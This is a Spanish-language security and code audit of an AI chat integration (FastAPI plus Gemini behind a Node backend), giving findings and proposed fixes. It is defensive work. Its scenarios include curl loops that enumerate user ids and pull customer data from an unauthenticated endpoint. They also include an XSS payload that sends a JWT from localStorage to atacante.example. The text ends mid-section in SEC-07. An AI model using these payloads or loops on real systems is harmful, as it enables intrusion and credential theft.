# Auditoría técnica — OPCIÓN 1 (IA vía Google Gemini) — Sistema Menaje

- **Fecha:** 2026-09-27
- **Commit auditado:** `bddc56b` (`fix: aumentar límite de mensaje en /api/ia/chat y documentar FASE 4`)
- **Alcance:** todo lo relacionado con la integración de IA de OPCIÓN 1 — microservicio `python-ia/`, capa Node (`backend/services/iaService.js`, `backend/middleware/rateLimitIA.js`, ruta `/api/ia/*`), frontend (`chatwidget.js`, `recommendationcards.js`, `ia-integration.js`), tabla `conversaciones_ia` y configuración (`.env`, `requirements.txt`).
- **Restricción de alcance respetada:** todas las correcciones propuestas se mantienen dentro de OPCIÓN 1 (LLM externo + prompt engineering + validación contra la base de datos real). Lo que requeriría entrenar modelos, redes neuronales o embeddings/vector DB está listado aparte en la sección **7. Fuera de alcance de OPCIÓN 1** y **no** se propone como mejora.

> **Nota sobre el informe previo:** no se encontró `INFORME_INTEGRACION_IA_MENAJE.md` en el repositorio ni en el historial de git (`git ls-tree -r HEAD` solo lista `OPCION_1_INTEGRATION_PLAN.md`, `README.md`, `RESUMEN_EJECUTIVO_OPCION_1_FINAL.md` —los tres borrados en el working tree—, `backend/frontend/README_FASE3_CHAT_RECOMMENDATIONS.md` y `python-ia/README.md`). Esta auditoría se hizo leyendo el código fuente directamente, no el informe.

---

## 1. Resumen

**34 hallazgos** en total, distribuidos así:

| Sección | Cantidad | Naturaleza |
|---|---|---|
| 2. Seguridad | 9 | 1 crítico, 3 altos, 4 medios, 1 bajo |
| 3. Bugs funcionales | 10 | 3 altos, 4 medios, 3 bajos |
| 4. Calidad de código | 9 | sin cambio de funcionalidad |
| 5. Experiencia de usuario | 6 | dentro de OPCIÓN 1 |

**Bugs reales (el sistema ya se comporta mal, o se romperá de forma predecible): 11**
→ BUG-01 … BUG-10, más SEC-07 (el rate limit se desactiva o bloquea todo según el valor de `RATE_LIMIT_IA`).

**Mejoras de calidad/seguridad (el sistema funciona, pero el riesgo o la deuda es real): 23**
→ SEC-01 … SEC-06, SEC-08, SEC-09 (8 de endurecimiento de seguridad), CAL-01 … CAL-09 (9 de calidad), UX-01 … UX-06 (6 de experiencia).

### Corregir **antes** de la próxima presentación (9)

Ordenados por relación impacto/esfuerzo. El detalle y el diff de cada uno está en su sección.

| # | Hallazgo | Por qué antes de presentar |
|---|---|---|
| 1 | **SEC-01** — `POST /chat` sin autenticación y escuchando en `0.0.0.0:8000` | Es el hallazgo crítico. En una demo sobre Wi-Fi compartido cualquier asistente puede llamar al microservicio, gastar la cuota de Gemini y leer datos de clientes iterando `usuario_id`. |
| 2 | **SEC-08** — rotar `API_GEMINI_KEY` y sacarla de `backend/.env` | La clave está en texto plano en dos archivos y citada en el README. Rotarla antes de mostrar el proyecto es barato y elimina el riesgo de que quede expuesta en una captura de pantalla. |
| 3 | **BUG-01** — `ia-integration.js` se inicializa dos veces | Duplica cada llamada de auto-recomendación. Con `RATE_LIMIT_IA=5` la demo se queda en `429 Demasiadas solicitudes` después de ~2 mensajes. Es el fallo más probable en vivo. |
| 4 | **BUG-03** — la validación anti-alucinación exige nombre exacto | Una tilde o un espacio de diferencia descarta un producto válido; si falla en todos, la pantalla de recomendaciones queda vacía delante del público. |
| 5 | **UX-01** — grid vacío sin explicación cuando se descarta todo | Es el síntoma visible de BUG-03. Aunque BUG-03 se arregle, conviene que el estado vacío diga algo. |
| 6 | **SEC-03** — los errores de Gemini se muestran literalmente en el chat | Si la cuota se agota durante la demo, el widget imprime el endpoint, el modelo y el mensaje crudo de Google en pantalla. |
| 7 | **SEC-02** — `/docs`, `/redoc` y `/openapi.json` abiertos | Un asistente con la URL puede ejecutar `POST /chat` desde Swagger "Try it out" sin credenciales. |
| 8 | **BUG-06** — `GROQ_API_KEY` existe pero no se usa en ningún sitio | Si alguien pregunta "¿y si Gemini se cae?", la variable sugiere un fallback que no existe (`main.py:293-295` solo lanza 502). Eliminarla evita afirmar algo falso. |
| 9 | **BUG-05** — URL cableada a `http://localhost:3000` en `chatwidget.js:17` | Si la demo no se sirve exactamente desde `localhost:3000` (otro puerto, la IP de la LAN, un túnel), el chat no responde. `recommendationcards.js` ya usa rutas relativas: solo el chat tiene el problema. |

**Se puede dejar para después de la presentación:** CAL-01 … CAL-09 (no cambian comportamiento), SEC-04 … SEC-07, SEC-09, BUG-02 (rompe a ~70 productos; hoy hay 28), BUG-04, BUG-07 … BUG-10, UX-02 … UX-06.

---

## 2. Hallazgos de seguridad

### SEC-01 — `POST /chat` no exige autenticación propia y el servicio escucha en todas las interfaces
**Severidad: CRÍTICO**

**Archivos y líneas**
- `python-ia/main.py:251-257` — el endpoint solo valida forma (`mensaje` no vacío, `usuario_id > 0`), no identidad.
- `python-ia/main.py:323` — `uvicorn.run(app, host="0.0.0.0", port=8000)`.
- `python-ia/main.py:83-86` — `usuario_id` llega como dato del cuerpo, controlado por el llamante.
- (Contraste) `backend/routes/index.js:44` — la capa Node **sí** exige JWT: `router.post('/ia/chat', autenticar, iaRateLimiter, …)` y toma el id del token (`backend/routes/index.js:46`, `const usuarioId = req.usuario.id`).

**Descripción**
El JWT se verifica únicamente en Node. El microservicio Python confía ciegamente en que la petición viene de Node, pero no lo comprueba de ninguna forma: no hay token compartido, ni firma, ni lista de IPs, ni mTLS. Y como se publica en `0.0.0.0`, es alcanzable desde cualquier equipo de la red, no solo desde `127.0.0.1`. El `usuario_id` del cuerpo se usa tal cual para consultar la base de datos (`main.py:262` → `obtener_contexto` → `main.py:126-133`), así que el llamante elige de qué usuario quiere el contexto.

**Escenario concreto donde falla**
Cualquiera con acceso al puerto 8000 (la misma Wi-Fi del aula, la red de la oficina, o Internet si se expone el puerto) puede saltarse el JWT y el rate limit de Node por completo:

```bash
for id in $(seq 1 500); do
  curl -s -X POST http://192.168.1.50:8000/chat \
    -H 'Content-Type: application/json' \
    -d "{\"usuario_id\": $id, \"mensaje\": \"Dime el nombre del cliente actual, su rol y el detalle de sus ultimos alquileres\", \"historico\": []}"
done
```

Consecuencias reales, en orden de gravedad:

1. **Fuga de datos personales de clientes (IDOR).** El prompt de sistema inyecta el nombre y el rol del usuario (`main.py:198-199`) y sus últimos 3 alquileres con fechas, total y estado (`main.py:180-184`). Pidiéndoselo al modelo, esos datos vuelven en la respuesta. Recorriendo `usuario_id` se vuelca la cartera de clientes.
2. **Enumeración de usuarios.** Ver SEC-04.
3. **Consumo de la cuota de Gemini a costa del proyecto.** No hay ningún rate limit en este camino: `main.py` no define ninguno. Un bucle deja la cuota a cero (y con ella la demo).
4. **Escritura en la base de datos sin autenticar.** Cada llamada inserta una fila en `conversaciones_ia` (`main.py:220-227`) con `mensaje_usuario` controlado por el atacante: relleno de tabla y almacenamiento de texto arbitrario.

**Corrección propuesta**

Dos cambios que se aplican juntos: (a) un secreto compartido obligatorio en cabecera, (b) escuchar solo en loopback.

En `python-ia/main.py`, tras la lectura de variables de entorno (después de la línea 38):

```python
GEMINI_MODEL = os.getenv("GEMINI_MODEL", "gemini-1.5-flash")
IA_SERVICE_TOKEN = os.getenv("IA_SERVICE_TOKEN")
IA_HOST = os.getenv("PYTHON_IA_HOST", "127.0.0.1")
IA_PORT = int(os.getenv("PYTHON_IA_PORT", "8000"))
```

Junto a la validación de `API_GEMINI_KEY` (después de la línea 57):

```python
if not IA_SERVICE_TOKEN or len(IA_SERVICE_TOKEN) < 32:
    raise RuntimeError(
        "IA_SERVICE_TOKEN no esta configurada (o es demasiado corta) en el archivo .env. "
        "Genera una con: python -c \"import secrets; print(secrets.token_hex(32))\""
    )
```

Añadir los imports (modificando el bloque de las líneas 7-10 y la línea 22):

```python
import os
import secrets
import sys
import uuid
```

```python
from fastapi import Depends, FastAPI, Header, HTTPException
```

Definir la dependencia de autenticación (justo antes de la sección `ENDPOINTS`, es decir antes de la línea 237):

```python
def verificar_token_servicio(
    x_ia_token: Optional[str] = Header(default=None, alias="X-IA-Token"),
) -> None:
    """
    Autenticacion servicio-a-servicio: solo el backend Node.js conoce IA_SERVICE_TOKEN.
    Se compara con compare_digest para no filtrar informacion por tiempo de respuesta.
    """
    if not x_ia_token or not secrets.compare_digest(x_ia_token, IA_SERVICE_TOKEN):
        raise HTTPException(status_code=401, detail="No autorizado")
```

Aplicarla al endpoint (reemplaza `main.py:251-252`):

```python
@app.post("/chat", response_model=ChatResponse, dependencies=[Depends(verificar_token_servicio)])
def chat(request: ChatRequest) -> ChatResponse:
```

Cambiar el arranque (`main.py:319` y `main.py:323`):

```python
    print(f"URL local: http://{IA_HOST}:{IA_PORT}")
    ...
    uvicorn.run(app, host=IA_HOST, port=IA_PORT)
```

En `backend/services/iaService.js`, enviar la cabecera. Reemplazar la línea 5:

```javascript
const PYTHON_IA_URL = process.env.PYTHON_IA_URL || 'http://127.0.0.1:8000';
const IA_SERVICE_TOKEN = process.env.IA_SERVICE_TOKEN;

if (!IA_SERVICE_TOKEN) {
    throw new Error('Falta la variable de entorno IA_SERVICE_TOKEN (debe coincidir con la de python-ia/.env)');
}
```

Reemplazar el bloque de opciones de `axios.post` (`iaService.js:21-26`):

```javascript
            {
                timeout: 120000, // 120 segundos timeout (Gemini puede tardar 20-50s)
                headers: {
                    'Content-Type': 'application/json',
                    'X-IA-Token': IA_SERVICE_TOKEN
                }
            }
```

Y en `verificarIA` (`iaService.js:65`):

```javascript
        const response = await axios.get(`${PYTHON_IA_URL}/health`, {
            timeout: 5000,
            headers: { 'X-IA-Token': IA_SERVICE_TOKEN }
        });
```

Generar el secreto y añadirlo a **ambos** `.env` con el mismo valor:

```bash
python -c "import secrets; print('IA_SERVICE_TOKEN=' + secrets.token_hex(32))"
```

**Nota:** si en el futuro el microservicio debe deducir el usuario por sí mismo, la vía correcta dentro de OPCIÓN 1 es que Node le reenvíe el JWT y Python lo verifique con el mismo `JWT_SECRET` (con `PyJWT`), en vez de aceptar `usuario_id` del cuerpo. El token compartido es el cambio mínimo y suficiente hoy.

---

### SEC-02 — Swagger UI (`/docs`), ReDoc (`/redoc`) y `/openapi.json` expuestos sin autenticación
**Severidad: ALTO**

**Archivos y líneas**
- `python-ia/main.py:63-67` — `FastAPI(title=…, description=…, version="1.0.0")` sin `docs_url`/`redoc_url`/`openapi_url`, por lo que FastAPI habilita las tres rutas por defecto.
- `python-ia/main.py:320` — el propio arranque publicita la URL de Swagger.
- `python-ia/README.md:81` — la documenta como parte del servicio.

**Descripción**
Las rutas de documentación interactiva están activas y son públicas. Combinadas con SEC-01 (sin autenticación) no solo revelan la superficie de ataque: la ejecutan. Swagger UI trae un botón *Try it out* que construye la petición por el atacante.

**Escenario concreto donde falla**
Cualquiera con acceso al puerto 8000 abre `http://192.168.1.50:8000/docs`, ve el esquema completo de `ChatRequest` (`usuario_id`, `mensaje`, `historico`), pulsa *Try it out*, pone `usuario_id: 1` y obtiene una respuesta del modelo con los datos de ese cliente — sin escribir una línea de código ni tener credenciales. `/openapi.json` además confirma título, versión y descripción del servicio, útiles para identificar el stack.

**Corrección propuesta**

En `python-ia/main.py`, junto a las demás variables de entorno (tras la línea 38):

```python
IA_ENV = os.getenv("IA_ENV", "production").lower()
DOCS_HABILITADOS = IA_ENV in ("dev", "development", "local")
```

Reemplazar `main.py:63-67` por:

```python
app = FastAPI(
    title="Menaje IA Service",
    description="Microservicio FastAPI + Gemini para el asistente de alquiler de menaje",
    version="1.0.0",
    # La documentacion interactiva solo se publica en desarrollo (IA_ENV=dev).
    # En produccion /docs, /redoc y /openapi.json quedan deshabilitados (404).
    docs_url="/docs" if DOCS_HABILITADOS else None,
    redoc_url="/redoc" if DOCS_HABILITADOS else None,
    openapi_url="/openapi.json" if DOCS_HABILITADOS else None,
)
```

Ajustar el mensaje de arranque (`main.py:320`) para no anunciar algo que puede no existir:

```python
    if DOCS_HABILITADOS:
        print(f"Documentacion (Swagger): http://{IA_HOST}:{IA_PORT}/docs")
    else:
        print("Documentacion (Swagger): deshabilitada (IA_ENV != dev)")
```

Con `IA_ENV` sin definir, el comportamiento por defecto es el seguro (documentación cerrada). Para desarrollo local se añade `IA_ENV=dev` a `python-ia/.env`.

---

### SEC-03 — El mensaje de error crudo de Gemini viaja hasta el navegador del cliente
**Severidad: ALTO**

**Archivos y líneas**
- `python-ia/main.py:295` — `raise HTTPException(status_code=502, detail=f"Error consultando Gemini: {error}")` interpola la excepción original en el `detail`.
- `backend/services/iaService.js:46-51` — Node reenvía ese `detail` tal cual: `error: error.response.data?.detail || 'Error en servicio de IA'`.
- `backend/routes/index.js:76-81` — la ruta lo devuelve al frontend en el campo `error`.
- `backend/frontend/assets/js/chatwidget.js:150-151` — el widget lanza `new Error(body.error)`…
- `backend/frontend/assets/js/chatwidget.js:172-175` — …y lo imprime en la burbuja de chat mediante `this.addMessage(...)` con `'bot-error'`.

**Descripción**
La cadena completa (Gemini → FastAPI → Node → navegador) propaga el texto de la excepción sin sanear. Las excepciones del SDK `google-generativeai` incluyen el endpoint, el nombre del modelo, el código de estado de Google y, según el error, fragmentos de la petición o pistas sobre la credencial.

**Escenario concreto donde falla**
Se agota la cuota o la clave es inválida durante la demo. El cliente ve, dentro del chat, un texto del estilo:

```
Error: Error consultando Gemini: 400 API key not valid. Please pass a valid API key.
[reason: "API_KEY_INVALID" domain: "googleapis.com" metadata { key: "service"
value: "generativelanguage.googleapis.com" }]. Por favor, intenta de nuevo.
```

Eso revela a cualquier usuario final el proveedor (Google Generative Language API), el modelo exacto en uso, el motivo interno del fallo y que la credencial del servidor está mal configurada. Un atacante lo usa para distinguir "clave inválida" de "cuota agotada" de "modelo inexistente", y así medir el estado del backend. El mismo camino se activa con cualquier `Exception` del bloque `main.py:282-295`, incluidos timeouts y errores de red que pueden contener rutas internas.

**Corrección propuesta**

Devolver un mensaje genérico al cliente y dejar el detalle solo en el log del servidor, con un identificador de correlación para poder cruzarlos. Reemplazar `python-ia/main.py:293-295`:

```python
    except Exception as error:
        # El detalle tecnico se queda en el log del servidor; al cliente solo le llega
        # un mensaje generico + un id de correlacion para poder rastrear el incidente.
        error_id = uuid.uuid4().hex[:12]
        print(
            f"[{error_id}] Error llamando a Gemini API "
            f"(usuario_id={request.usuario_id}, modelo={GEMINI_MODEL}): {error!r}"
        )
        guardar_conversacion(
            request.usuario_id, request.mensaje, f"[error {error_id}]", 0, estado="error"
        )
        raise HTTPException(
            status_code=502,
            detail=f"El asistente no esta disponible en este momento (ref: {error_id})",
        )
```

Requiere el import de `uuid` (ver SEC-01). La llamada a `guardar_conversacion` con `estado="error"` requiere **BUG-04**; si se aplica SEC-03 antes que BUG-04, omitir esas tres líneas y aplicar ambos hallazgos juntos después.

Complementariamente, en `backend/services/iaService.js:46-51`, no reenviar detalles de errores 5xx del microservicio:

```javascript
        if (error.response) {
            // Los 4xx del microservicio son de validacion y son seguros de mostrar;
            // los 5xx pueden contener detalles internos, asi que se registran y se enmascaran.
            const status = error.response.status;
            if (status >= 400 && status < 500) {
                return {
                    success: false,
                    error: error.response.data?.detail || 'Solicitud no válida para el servicio de IA'
                };
            }
            console.error(`Error ${status} del servicio IA:`, error.response.data);
            return {
                success: false,
                error: 'El asistente no está disponible en este momento. Intenta de nuevo en unos minutos.'
            };
        }
```

---

### SEC-04 — Enumeración de usuarios por el 404 "Usuario no encontrado"
**Severidad: MEDIO**

**Archivos y líneas**
- `python-ia/main.py:130-132` — `if usuario is None: raise HTTPException(status_code=404, detail="Usuario no encontrado")`.
- `python-ia/main.py:163-164` — el `except HTTPException: raise` deja pasar ese 404 intacto hasta el cliente.

**Descripción**
El servicio responde de forma distinguible según si el `usuario_id` existe o no: `404` con un detalle explícito frente a `200` con respuesta del modelo. Es un oráculo de existencia de cuentas.

**Escenario concreto donde falla**
Cualquiera con acceso al puerto 8000 (SEC-01) recorre `usuario_id` de 1 a 10000 y, sin autenticarse, obtiene el mapa exacto de ids de usuario válidos del sistema, incluido cuántos clientes hay registrados:

```bash
for id in $(seq 1 10000); do
  code=$(curl -s -o /dev/null -w '%{http_code}' -X POST http://192.168.1.50:8000/chat \
    -H 'Content-Type: application/json' -d "{\"usuario_id\":$id,\"mensaje\":\"hola\"}")
  [ "$code" = "200" ] && echo "usuario $id existe"
done
```

Ese listado es la entrada para SEC-01 (extracción dirigida de datos) y reduce el coste de un ataque de fuerza bruta sobre `/api/auth/login`, porque solo se prueban ids/cuentas que se sabe que existen.

**Corrección propuesta**

Una vez aplicado SEC-01 el `usuario_id` proviene del JWT que Node ya validó, así que un id inexistente pasa a ser un error interno, no una condición esperada del cliente. Reemplazar `python-ia/main.py:126-133`:

```python
            # Datos del usuario
            cur.execute(
                "SELECT id, nombre, correo, rol FROM usuarios WHERE id = %s",
                (usuario_id,),
            )
            usuario = cur.fetchone()
            if usuario is None:
                # No se devuelve 404: distinguir "existe / no existe" permite enumerar
                # cuentas. Se registra en el log y se continua con contexto anonimo.
                print(f"Contexto sin usuario: usuario_id={usuario_id} no existe en BD")
            else:
                contexto["usuario"] = dict(usuario)
```

`construir_system_prompt` ya tolera un `usuario` vacío: usa `usuario.get('nombre', 'Desconocido')` (`main.py:198`) sobre un `dict` por defecto (`main.py:176`). El resultado es un `200` con una respuesta genérica en ambos casos, sin canal de información.

---

### SEC-05 — El CORS del microservicio da una falsa sensación de protección
**Severidad: MEDIO**

**Archivos y líneas**
- `python-ia/main.py:69-76` — `CORSMiddleware` con `allow_origins=["http://localhost:3000"]`, `allow_credentials=True`, `allow_methods=["GET","POST"]`, `allow_headers=["*"]`.

**Descripción**
Tres problemas superpuestos:

1. **CORS no es un control de acceso.** Solo restringe a los *navegadores*. `curl`, Postman, un script de Python o cualquier cliente que no implemente la política lo ignoran por completo. El comentario de la línea 69 ("CORS solo para el frontend en desarrollo") sugiere que este middleware limita quién puede llamar al servicio, y no lo hace. La protección real es SEC-01.
2. **`allow_credentials=True` con `allow_headers=["*"]` es más permisivo de lo necesario.** El microservicio no usa cookies ni sesiones; no hay ninguna credencial de navegador que enviar.
3. **El origen está cableado a `http://localhost:3000`.** Es el mismo problema de configuración que BUG-05: al desplegar con otro dominio habría que editar código.

Además, la arquitectura declarada es navegador → Node → FastAPI (`backend/services/iaService.js:14-27`). El navegador **nunca** llama al microservicio, así que el middleware no aporta nada funcional.

**Escenario concreto donde falla**
Un desarrollador ve `allow_origins=["http://localhost:3000"]` y concluye que el puerto 8000 está protegido, por lo que no considera urgente SEC-01. Mientras tanto, `curl -X POST http://host:8000/chat -d '{"usuario_id":1,"mensaje":"..."}'` funciona sin ninguna restricción, porque `curl` no envía `Origin` ni respeta la respuesta de preflight.

**Corrección propuesta**

Eliminar el middleware por completo (reemplazar `python-ia/main.py:69-76` por el comentario explicativo), ya que ningún navegador debe hablar con este servicio:

```python
# Sin CORS: este microservicio solo se consume desde el backend Node.js
# (backend/services/iaService.js), nunca desde el navegador. CORS ademas solo
# restringe navegadores, no clientes como curl/Postman: el control de acceso real
# es la cabecera X-IA-Token (verificar_token_servicio) + escuchar en 127.0.0.1.
```

Y quitar el import ya innecesario (`main.py:23`):

```python
# eliminar: from fastapi.middleware.cors import CORSMiddleware
```

Si se prefiere conservarlo para poder depurar desde el navegador en desarrollo, hacerlo condicionado a `IA_ENV` (que ya se introduce en SEC-02) y sin credenciales:

```python
if DOCS_HABILITADOS:  # solo en IA_ENV=dev
    app.add_middleware(
        CORSMiddleware,
        allow_origins=[os.getenv("CORS_ORIGIN_IA", "http://localhost:3000")],
        allow_credentials=False,
        allow_methods=["GET", "POST"],
        allow_headers=["Content-Type", "X-IA-Token"],
    )
```

---

### SEC-06 — XSS almacenado: nombres, descripciones y URLs de producto se inyectan con `innerHTML`
**Severidad: ALTO**

**Archivos y líneas**
- `backend/frontend/assets/js/recommendationcards.js:303-344` — `card.innerHTML = \`…\`` con interpolación directa. En concreto:
  - `:305` — `<h3>${recomendacion.nombre}</h3>` (viene de `productos.nombre` en BD, vía `:243`).
  - `:310-312` — `<img src="${recomendacion.imagen}" alt="${recomendacion.nombre}" onerror="…">` (viene de `productos.foto_url`, vía `:251`).
  - `:316` — `<p>${recomendacion.descripcion}</p>` (viene de `item.motivo`, texto libre **generado por el modelo**, o de `productos.descripcion`, vía `:246`).
- `backend/frontend/assets/js/recommendationcards.js:415` — `<td>${prod.nombre}</td>` en la tabla del resumen, mismo problema.
- `backend/controllers/productosController.js:37-47` — `crearProducto` inserta `nombre`, `descripcion` y `foto_url` en BD **sin validación ni saneado**; solo comprueba que no estén vacíos (`:39-40`).
- `backend/routes/index.js:130` — la ruta está abierta a los roles `trabajador` y `dueno`.
- (Contraste) `backend/frontend/assets/js/chatwidget.js:249-256` — el widget de chat **sí** escapa, usando `div.textContent` antes de aplicar el formato. `recommendationcards.js` no tiene equivalente.

**Descripción**
Todo el texto que entra en las tarjetas de recomendación se interpola en HTML sin escapar. Hay dos fuentes no confiables: la base de datos (rellenada por `trabajador`/`dueno`) y la salida del modelo (`item.motivo`). Como el JWT se guarda en `localStorage` (`chatwidget.js:228`, `recommendationcards.js:539`), un XSS permite robarlo directamente desde JavaScript.

**Escenario concreto donde falla**
Un usuario con rol `trabajador` —el rol con menos privilegios que puede crear productos— registra un producto con este nombre:

```json
POST /api/productos
{ "nombre": "Copa Premium<img src=x onerror=\"fetch('https://atacante.example/r?t='+localStorage.getItem('token'))\">",
  "categoria_id": 1, "precio_unidad": 1.8, "stock_inicial": 100 }
```

A partir de ahí, **cualquier cliente o dueño** que pida recomendaciones y reciba ese producto ejecuta el script en su navegador: el nombre entra al catálogo (`getCatalogo`, `productosController.js:7-29`), viaja al prompt (`recommendationcards.js:164-166`), el modelo lo devuelve, `resolverContraCatalogo` lo resuelve contra el catálogo real (`:235`) y `createRecommendationCard` lo escribe con `innerHTML` (`:305`). El resultado es la escalada de privilegios `trabajador` → robo del JWT de un `dueno`, con el que se accede a reportes, gestión de usuarios y ajuste de stock.

La variante con `foto_url` es aún más corta, porque el atributo no está entrecomillado de forma segura: `foto_url = "x\" onerror=\"…"` rompe el atributo `src` en `:310`. Y `item.motivo` (`:316`) permite el mismo ataque si el modelo reproduce HTML presente en su entrada, por ejemplo si el nombre del tipo de evento o de un producto lo contiene.

**Corrección propuesta**

Escapar en el punto de salida. Añadir un helper a la clase `RecommendationCards` (por ejemplo junto a `getJWT`, antes de la línea 538):

```javascript
    /**
     * Escapa texto para interpolarlo en HTML. El nombre/descripcion de un producto
     * los escribe un trabajador o dueno en el inventario, y el "motivo" lo genera
     * el modelo: ninguno de los dos es contenido confiable.
     */
    escaparHTML(valor) {
        return String(valor ?? '')
            .replace(/&/g, '&amp;')
            .replace(/</g, '&lt;')
            .replace(/>/g, '&gt;')
            .replace(/"/g, '&quot;')
            .replace(/'/g, '&#39;');
    }

    /**
     * Solo admite URLs http(s) o rutas relativas del propio sitio; cualquier otra
     * cosa (javascript:, data:, un atributo roto) cae al logo por defecto.
     */
    urlImagenSegura(valor) {
        const url = String(valor ?? '').trim();
        if (/^https?:\/\//i.test(url) || /^\/[^/]/.test(url)) {
            return this.escaparHTML(url);
        }
        return '/assets/img/logo.png';
    }
```

Reemplazar el `card.innerHTML` de `recommendationcards.js:303-344` usando los helpers (solo cambian las interpolaciones de texto; el resto del marcado es idéntico):

```javascript
        const nombreSeguro = this.escaparHTML(recomendacion.nombre);
        const tierSeguro = this.escaparHTML(recomendacion.tier);
        const descripcionSegura = this.escaparHTML(recomendacion.descripcion);
        const imagenSegura = this.urlImagenSegura(recomendacion.imagen);

        card.innerHTML = `
            <div class="card-header">
                <h3>${nombreSeguro}</h3>
                <span class="card-badge ${tierSeguro}">${tierSeguro}</span>
            </div>

            <div class="card-image">
                <img src="${imagenSegura}"
                     alt="${nombreSeguro}"
                     onerror="this.src='/assets/img/logo.png'">
            </div>

            <div class="card-description">
                <p>${descripcionSegura}</p>
            </div>

            <div class="card-details">
                <div class="detail-row">
                    <strong>Cantidad sugerida:</strong>
                    <span>${recomendacion.cantidad} unidades</span>
                </div>
                <div class="detail-row">
                    <strong>Precio Unitario:</strong>
                    <span>S/ ${recomendacion.precio_unidad.toFixed(2)}</span>
                </div>
                <div class="detail-row">
                    <strong>Stock Disponible:</strong>
                    <span class="stock ${recomendacion.stock_disponible > 0 ? 'in-stock' : 'out-stock'}">
                        ${recomendacion.stock_disponible > 0 ? recomendacion.stock_disponible : 'Sin stock'}
                    </span>
                </div>
            </div>

            <div class="card-footer">
                <div class="card-price">
                    <strong>S/ ${recomendacion.subtotal.toFixed(2)}</strong>
                </div>
                <button class="btn btn-secondary add-to-selection" data-index="${index}" ${recomendacion.stock_disponible > 0 ? '' : 'disabled'}>
                    Agregar
                </button>
            </div>
        `;
```

(`cantidad`, `precio_unidad`, `subtotal` y `stock_disponible` ya son numéricos por `parseInt`/`parseFloat` en `:238-250`, así que no necesitan escape.)

Y en la tabla del resumen, reemplazar `recommendationcards.js:415`:

```javascript
                                <td>${this.escaparHTML(prod.nombre)}</td>
```

**Defensa en profundidad (recomendado, no imprescindible):** validar en el servidor al crear el producto. En `backend/controllers/productosController.js`, tras la comprobación de la línea 39-40:

```javascript
  if (/[<>]/.test(nombre) || (descripcion && /[<>]/.test(descripcion)))
    return res.status(400).json({ error: 'El nombre y la descripción no admiten los caracteres < ni >' });
  if (foto_url && !/^https?:\/\//i.test(foto_url))
    return res.status(400).json({ error: 'La URL de la foto debe empezar por http:// o https://' });
```

---

### SEC-07 — El rate limit de IA es por IP, y `RATE_LIMIT_IA` se usa como cadena sin convertir
**Severidad: MEDIO** *(el segundo punto es además un bug real)*

**Archivos y líneas**
- `backend/middleware/rateLimitIA.js:7` — `max: process.env.RATE_LIMIT_IA || 5`.
- `backend/middleware/rateLimitIA.js:12` — `standardHeaders: false`.
- `backend/middleware/rateLimitIA.js:13-16` — `skip` basado en `req.path`.
- `backend/.env:16` — `RATE_LIMIT_IA=5`.
- `backend/node_modules/express-rate-limit/dist/index.cjs:809` — `limit: passedOptions.max ?? 5` (`max` sigue soportado como alias obsoleto en la v8.7.0 instalada).
- `backend/node_modules/express-rate-limit/dist/index.cjs:486-493` — `validations.limit()` **solo** avisa si el valor es estrictamente `0` (`limit === 0`); no valida el tipo.
- `backend/node_modules/express-rate-limit/dist/index.cjs:1050` — la comparación efectiva: `if (totalHits > limit)`.

**Descripción**
Dos problemas independientes en el mismo middleware.

**(a) El límite se cuenta por IP, no por usuario.** La clave por defecto de `express-rate-limit` es la IP del cliente. Como el sistema **ya** autentica la ruta con JWT (`backend/routes/index.js:44`), hay una identidad mejor disponible y no se usa.

**(b) El valor de entorno llega como cadena.** `process.env.RATE_LIMIT_IA` es siempre `string`. Con `"5"` la comparación `totalHits > "5"` funciona por coerción numérica de JavaScript, así que hoy no se nota. Pero:
- `RATE_LIMIT_IA=0` → `"0"` es una cadena *truthy*, así que `|| 5` no la sustituye; y `validations.limit("0")` no dispara el aviso `WRN_ERL_MAX_ZERO` porque compara `=== 0` y `"0" !== 0`. Resultado: `totalHits > "0"` es cierto desde la primera petición → **todas** las peticiones de chat devuelven 429, en silencio y sin advertencia.
- `RATE_LIMIT_IA=` (vacío) → cae al `|| 5`, correcto por casualidad.
- `RATE_LIMIT_IA=cinco` o `RATE_LIMIT_IA=5 ` con un carácter no numérico → `totalHits > NaN` es siempre `false` → **el rate limit queda desactivado sin ningún error ni log**, y con él la única protección contra el agotamiento de la cuota de Gemini en la capa Node.

**Escenario concreto donde falla**
Escenario (a): 30 clientes conectados al Wi-Fi del local salen por la misma IP pública (NAT). Entre todos comparten 5 peticiones por minuto: el sexto cliente que escribe en el chat recibe `429 Demasiadas solicitudes` sin haber hecho nada. Simétricamente, un atacante con 200 IPs (o una botnet modesta) obtiene 1000 peticiones por minuto contra la cuota de Gemini, porque el límite no lo ata a su cuenta.

Escenario (b): alguien quiere "desactivar temporalmente el límite para probar" y pone `RATE_LIMIT_IA=0` en `backend/.env` esperando "sin límite". Obtiene lo contrario: el chat deja de funcionar por completo con 429 en la primera petición, sin ningún mensaje en el log que explique la causa. O bien un dedazo (`RATE_LIMIT_IA=1O` con la letra O) desactiva el rate limit sin que nadie se entere hasta que llega la factura o el corte de cuota.

**Corrección propuesta**

Reemplazar el contenido completo de `backend/middleware/rateLimitIA.js`:

```javascript
// middleware/rateLimitIA.js - Rate limiting para endpoint /api/ia/chat

const rateLimit = require('express-rate-limit');

// process.env siempre entrega cadenas: sin parseInt, RATE_LIMIT_IA=0 bloquearia
// todas las peticiones y un valor no numerico desactivaria el limite en silencio.
const LIMITE_POR_DEFECTO = 5;
const limiteConfigurado = Number.parseInt(process.env.RATE_LIMIT_IA ?? '', 10);
const LIMITE_IA = Number.isInteger(limiteConfigurado) && limiteConfigurado > 0
    ? limiteConfigurado
    : LIMITE_POR_DEFECTO;

if (process.env.RATE_LIMIT_IA && LIMITE_IA !== limiteConfigurado) {
    console.warn(
        `⚠️  RATE_LIMIT_IA="${process.env.RATE_LIMIT_IA}" no es un entero positivo; ` +
        `se usa el valor por defecto (${LIMITE_POR_DEFECTO} peticiones/minuto).`
    );
}

const iaRateLimiter = rateLimit({
    windowMs: 60 * 1000, // 1 minuto
    limit: LIMITE_IA,    // 'limit' es el nombre actual; 'max' esta obsoleto desde la v7
    // La ruta ya exige JWT, asi que se limita por usuario y no por IP: de lo contrario
    // todos los clientes detras de un mismo NAT comparten la misma cuota.
    keyGenerator: (req) => (req.usuario?.id ? `u:${req.usuario.id}` : `ip:${req.ip}`),
    standardHeaders: 'draft-7', // expone RateLimit / Retry-After para que el widget informe
    legacyHeaders: false,
    message: {
        success: false,
        error: 'Demasiadas solicitudes. Intenta de nuevo en 1 minuto.'
    }
});

module.exports = iaRateLimiter;
```

Notas sobre los cambios:
